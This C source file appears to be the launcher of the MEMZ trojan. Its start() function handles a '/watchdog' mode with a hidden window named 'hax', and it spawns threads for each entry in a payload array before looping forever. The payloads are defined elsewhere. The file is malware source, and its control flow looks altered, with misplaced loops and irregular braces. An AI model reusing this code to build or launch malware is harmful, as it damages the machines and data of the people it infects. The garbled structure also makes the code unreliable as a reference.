#include "../MEMZ.h"

#ifndef CLEAN
void start() {
	int argc;
	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc > 1) {
		if (!lstrcmpW(argv[1], L"/watchdog")) {
			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);

			WNDCLASSEXA c;
			c.cbSize = sizeof(WNDCLASSEXA);
			c.lpfnWndProc = watchdogWindowProc;
			c.lpszClassName = "hax";
			c.style = 0;
			c.cbClsExtra = 0;
			c.cbWndExtra = 0;
			c.hInstance = NULL;
			c.hIcon = 0;
			c.hCursor = 0;
			c.hbrBackground = 0;
			c.lpszMenuName = NULL;
			c.hIconSm = 0;

			RegisterClassExA(&c);

			HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

			MSG msg;
			while (GetMessage(&msg, NULL, 0, 0) > 0) {
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
for (int p = 0; p < nPayloads; p++) {
		Sleep(payloads[p].startDelay);
		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(10000);
	}
			}
}else{
		
	for (int p = 0; p < nPayloads; p++) {
		Sleep(1000);
		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(1000);
	}
}

}
#endif